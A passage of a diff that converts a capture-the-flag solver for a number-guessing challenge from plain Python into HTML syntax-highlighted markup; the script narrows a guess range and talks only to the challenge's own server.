+		<span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>] +<span class="org-py-number">1</span>
 
-	    log.info(f"MIN MAX: {min_max}")
-	    log.info(f"RANGE: {_range}")
+	    log.info(f<span class="org-string">"MIN MAX: </span><span class="org-py-variable-name">{min_max}</span><span class="org-string">"</span>)
+	    log.info(f<span class="org-string">"RANGE: </span><span class="org-py-variable-name">{_range}</span><span class="org-string">"</span>)
 
-	    if _range +1 &lt;= guess_left:
-		_guess = min_max[0]
-	    if guess_left &lt;= 1 and _range &gt; guess_left:
-		_guess = min_max[0]
-	except ZeroDivisionError as e:
-	    _guess = min_max[0]
+	    <span class="org-keyword">if</span> _range +<span class="org-py-number">1</span> &lt;= <span class="org-py-variable-name">guess_left</span>:
+		<span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
+	    <span class="org-keyword">if</span> guess_left &lt;= <span class="org-py-number">1</span> <span class="org-keyword">and</span> _range &gt; <span class="org-py-variable-name">guess_left</span>:
+		<span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
+	<span class="org-keyword">except</span> <span class="org-py-exception-name">ZeroDivisionError</span> <span class="org-keyword">as</span> <span class="org-py-variable-name">e</span>:
+	    <span class="org-py-variable-name">_guess</span> = min_max[<span class="org-py-number">0</span>]
 
-	log.info(f"guesses left: {guess_left}, high left: {guess_high_left}, low left: {guess_low_left}")
-	log.info(f"calculated percentage: {perc * 100}%")
+	log.info(f<span class="org-string">"guesses left: </span><span class="org-py-variable-name">{guess_left}</span><span class="org-string">, high left: </span><span class="org-py-variable-name">{guess_high_left}</span><span class="org-string">, low left: </span><span class="org-py-variable-name">{guess_low_left}</span><span class="org-string">"</span>)
+	log.info(f<span class="org-string">"calculated percentage: {perc * 100}%"</span>)
 
-	log.info(f"guess: {_guess}")
-	answer = guess(_guess)
-	log.info(f"answer: {answer}")
-	if "larger" in answer:
-	    min_max[0] = _guess
-	    guess_left -= 1
-	    guess_low_left -= 1
-	elif "Round" in answer:
-	    return answer
-	elif "flag" in answer:
-	    return answer
-	elif "loose" in answer:
-	    return answer
-	else:
-	    min_max[1] = _guess
-	    guess_left -= 1
-	    guess_high_left -= 1
+	log.info(f<span class="org-string">"guess: </span><span class="org-py-variable-name">{_guess}</span><span class="org-string">"</span>)
+	<span class="org-py-variable-name">answer</span> = guess(_guess)
+	log.info(f<span class="org-string">"answer: </span><span class="org-py-variable-name">{answer}</span><span class="org-string">"</span>)
+	<span class="org-keyword">if</span> <span class="org-string">"larger"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
+	    min_max[<span class="org-py-number">0</span>] = _guess
+	    <span class="org-py-variable-name">guess_left</span> -= <span class="org-py-number">1</span>
+	    <span class="org-py-variable-name">guess_low_left</span> -= <span class="org-py-number">1</span>
+	<span class="org-keyword">elif</span> <span class="org-string">"Round"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
+	    <span class="org-keyword">return</span> answer
+	<span class="org-keyword">elif</span> <span class="org-string">"flag"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
+	    <span class="org-keyword">return</span> answer
+	<span class="org-keyword">elif</span> <span class="org-string">"loose"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">answer</span>:
+	    <span class="org-keyword">return</span> answer
+	<span class="org-keyword">else</span>:
+	    min_max[<span class="org-py-number">1</span>] = _guess
+	    <span class="org-py-variable-name">guess_left</span> -= <span class="org-py-number">1</span>
+	    <span class="org-py-variable-name">guess_high_left</span> -= <span class="org-py-number">1</span>
 
-	guess_low_left = guess_left - guess_high_left
-    return
+	<span class="org-py-variable-name">guess_low_left</span> = guess_left - guess_high_left
+    <span class="org-keyword">return</span>
 
-if __name__ == '__main__':
-    io = remote("guess.hack.fe-ctf.dk", 1337)
-    total_guesses = 99
-    too_high = 3
+<span class="org-keyword">if</span> <span class="org-py-builtins">__name__</span> == <span class="org-string">'__main__'</span>:
+    <span class="org-py-variable-name">io</span> = remote(<span class="org-string">"guess.hack.fe-ctf.dk"</span>, <span class="org-py-number">1337</span>)
+    <span class="org-py-variable-name">total_guesses</span> = <span class="org-py-number">99</span>
+    <span class="org-py-variable-name">too_high</span> = <span class="org-py-number">3</span>
 
-    res = strategy("round 0")
-    while True:
-	res = strategy(res)
-	try:
-	    if "flag" in res or "loose" in res:
+    <span class="org-py-variable-name">res</span> = strategy(<span class="org-string">"round 0"</span>)
+    <span class="org-keyword">while</span> <span class="org-py-pseudo-keyword">True</span>:
+	<span class="org-py-variable-name">res</span> = strategy(res)
+	<span class="org-py-try-if">try</span>:
+	    <span class="org-keyword">if</span> <span class="org-string">"flag"</span> <span class="org-keyword">in</span> res <span class="org-keyword">or</span> <span class="org-string">"loose"</span> <span class="org-keyword">in</span> <span class="org-py-variable-name">res</span>:
 		log.info(res)
-		break
-	except:
-	    pass
-	log.info("======================NEW ROUND=========================")
+		<span class="org-keyword">break</span>
+	<span class="org-keyword">except</span>:
+	    <span class="org-keyword">pass</span>
+	log.info(<span class="org-string">"======================NEW ROUND========================="</span>)
 
     io.close()
 </pre>
